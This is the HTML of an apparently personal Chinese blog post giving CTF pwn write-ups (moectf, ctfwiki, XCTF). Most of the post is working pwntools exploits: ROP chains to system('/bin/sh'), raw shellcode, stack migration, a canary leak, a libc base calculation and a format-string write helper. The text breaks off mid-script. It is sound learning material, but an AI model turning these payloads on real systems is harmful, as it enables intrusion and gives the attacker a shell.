@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/unnamed.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/photo.gif">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="eaKNHevzJD712W6CICpiQ4_TgpzOgFr3dBKOwg7Hqs4">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"brubbish.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="主要是大二上刚开学做的题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="部分pwn题wp">
+<meta property="og:url" content="https://brubbish.github.io/26411.html">
+<meta property="og:site_name" content="Brubbish&#39;s">
+<meta property="og:description" content="主要是大二上刚开学做的题">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-10-05T12:49:39.014Z">
+<meta property="article:modified_time" content="2021-03-15T04:26:34.411Z">
+<meta property="article:author" content="Bruce">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://brubbish.github.io/26411.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://brubbish.github.io/26411.html","path":"26411.html","title":"部分pwn题wp"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>部分pwn题wp | Brubbish's</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Brubbish's</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-读过的书"><a href="/books/" rel="section"><i class="fa fa-bookmark fa-fw"></i>读过的书</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="6634125020"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+      </div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">2020moectf部分pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#rop1"><span class="nav-number">1.1.</span> <span class="nav-text">rop1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rop2"><span class="nav-number">1.2.</span> <span class="nav-text">rop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unusual"><span class="nav-number">1.3.</span> <span class="nav-text">unusual</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hard-shelcode"><span class="nav-number">1.4.</span> <span class="nav-text">hard_shelcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-migration"><span class="nav-number">1.5.</span> <span class="nav-text">baby_migration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-canary"><span class="nav-number">1.6.</span> <span class="nav-text">baby_canary</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">ctfwiki</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP"><span class="nav-number">2.1.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc3"><span class="nav-number">2.1.1.</span> <span class="nav-text">ret2libc3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">XCTF进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B"><span class="nav-number">3.1.</span> <span class="nav-text">实时数据监测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#welpwn"><span class="nav-number">3.2.</span> <span class="nav-text">welpwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#monkey"><span class="nav-number">3.3.</span> <span class="nav-text">monkey</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.4.</span> <span class="nav-text"></span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Bruce</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
+     crossorigin="anonymous"></script>
+<!-- sidebar -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="5504766755"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://brubbish.github.io/26411.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Bruce">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Brubbish's">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          部分pwn题wp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-05 20:49:39" itemprop="dateCreated datePublished" datetime="2021-10-05T20:49:39+08:00">2021-10-05</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-15 12:26:34" itemprop="dateModified" datetime="2021-03-15T12:26:34+08:00">2021-03-15</time>
+      </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>主要是大二上刚开学做的题</p>
+<span id="more"></span>
+<h1>2020moectf部分pwn</h1>
+<h2 id="rop1">rop1</h2>
+<p>wp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop1&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x400670</span></span><br><span class="line">binsh = <span class="number">0x00601070</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x0400933</span>) + p64(binsh) + p64(sys) </span><br><span class="line"><span class="comment">#400933为‘pop rdi,ret’</span></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<!--more-->
+<p>需要注意到，这题是x64的，跟x86的做法（ctfwiki-basicROP-ret2libc1）有些不同。<br>
+x64调用函数传递参数时先使用rdi、rsi、rdx、rcx、r8、r9（储存整数和指针）等，再用栈</p>
+<h2 id="rop2">rop2</h2>
+<p>wp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop2&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x0400670</span></span><br><span class="line">gets = <span class="number">0x04006b0</span></span><br><span class="line">pop_rdi = <span class="number">0x0400933</span></span><br><span class="line">bss = <span class="number">0x006010A8</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">136</span> + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(bss) + p64(sys)</span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>卡在少了最开始的p64(pop_rdi) + p64(bss)</p>
+<p>学长的解释是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">改变rdi的gadget地址 使其指向bss段的那个地址 </span><br></pre></td></tr></table></figure>
+<h2 id="unusual">unusual</h2>
+<p>用alpha3弄出一个Alphanumeric Shellcode</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span> asm(sc)</span><br><span class="line"><span class="comment">#sc.py</span></span><br><span class="line"></span><br><span class="line">python sc.py &gt; sc</span><br><span class="line"></span><br><span class="line">python alpha3/ALPHA3.py x64 <span class="built_in">ascii</span> mixedcase rax --<span class="built_in">input</span>=<span class="string">&quot;sc&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="hard-shelcode">hard_shelcode</h2>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">sh = process(<span class="string">&quot;./hard_shellcode&quot;</span>)</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sub_rsp = asm(<span class="string">&#x27;sub rsp, 64&#x27;</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">&#x27;jmp rsp&#x27;</span>)</span><br><span class="line">gadget = <span class="number">0x04000EA</span></span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">&#x27;a&#x27;</span>*(<span class="number">64</span>-<span class="built_in">len</span>(sc)) + sub_rsp + jmp_rsp + <span class="string">&#x27;b&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(sub_rsp)-<span class="built_in">len</span>(jmp_rsp)) + gadget</span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27;*16 + sc + sub_rsp + jmp_rsp + &#x27;b&#x27;*(8-len(sub_rsp)-len(jmp_rsp)) + p64(gadget) </span></span><br><span class="line"><span class="comment">## sub rsp,48</span></span><br><span class="line"> </span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>用gadget跳转到&quot;sub_rsp,jmp_rsp&quot;然后执行sc(shellcode)</p>
+<h2 id="baby-migration">baby_migration</h2>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./baby_migration&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x4011C8</span></span><br><span class="line">rbp = <span class="number">0x404060</span></span><br><span class="line"><span class="comment">#shell = asm(shellcraft.sh())</span></span><br><span class="line">shell = <span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;a&quot;</span>*<span class="number">0x30</span> + p64(rbp+<span class="number">300</span>) + p64(gets) </span><br><span class="line">payload2 = shell + <span class="string">&#x27;b&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(shell)) + p64(rbp ) + p64(rbp+<span class="number">300</span>-<span class="number">0x30</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-258030.htm">https://bbs.pediy.com/thread-258030.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049">https://blog.csdn.net/yuanyunfeng3/article/details/51456049</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈迁移 的核心思想就是 将栈 的 esp 和 ebp 转移到一个 输入不受长度限制的 且可控制 的 址处，通常是 bss 段地址！ 在最后 ret 的时候 如果我们能够控制得 了 栈顶 esp指向的地址 就想到于 控制了 程序执行流！</span><br></pre></td></tr></table></figure>
+<p>用pwntolls生成的shellcode执行不了，可能是因为太长？</p>
+<h2 id="baby-canary">baby_canary</h2>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./baby_canary&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;sec.arttnba3.cn&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./baby_canary&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pluto/Desktop/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x41</span></span><br><span class="line">p.send(payload1)	<span class="comment">#dont use sendline</span></span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line"></span><br><span class="line">canary = u32(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">payload2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(puts_plt) + p32(start) + p32(puts_got)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;flag!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()	</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0xc</span> + p32(sys_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>在覆盖’\x00’得到canary时不能用sendline</p>
+<p>这题在本地弄不出来，在远程上就可以。发现是用的libc不一样，本机为libc6-i386_2.21-0ubuntu4_amd64，服务器上是libc6-i386_2.23-0ubuntu11.2_amd64</p>
+<h1>ctfwiki</h1>
+<h2 id="ROP">ROP</h2>
+<h3 id="ret2libc3">ret2libc3</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">stack = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = stack + p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">recv1 = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts.got_addr= &quot;</span>,<span class="built_in">hex</span>(recv1))</span><br><span class="line"><span class="comment">#puts.got = cb0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x05fcb0</span></span><br><span class="line">sys_offset = <span class="number">0x03adb0</span></span><br><span class="line">binsh_offset = <span class="number">0x15bb0b</span> </span><br><span class="line"></span><br><span class="line">libc_base = recv1 - puts_offset</span><br><span class="line">sys_addr = libc_base + sys_offset</span><br><span class="line">binsh = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload2 = stack + p32(sys_addr) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>libc 对应的是libc6_2.23-0ubuntu11.2_i386，对此是完全没想到的…</p>
+<p>讲的挺好的https://www.jianshu.com/p/83f55c55c173</p>
+<h1>XCTF进阶</h1>
+<h2 id="实时数据监测">实时数据监测</h2>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">35866</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,<span class="number">0x0804a048</span>,<span class="number">0x02223322</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span 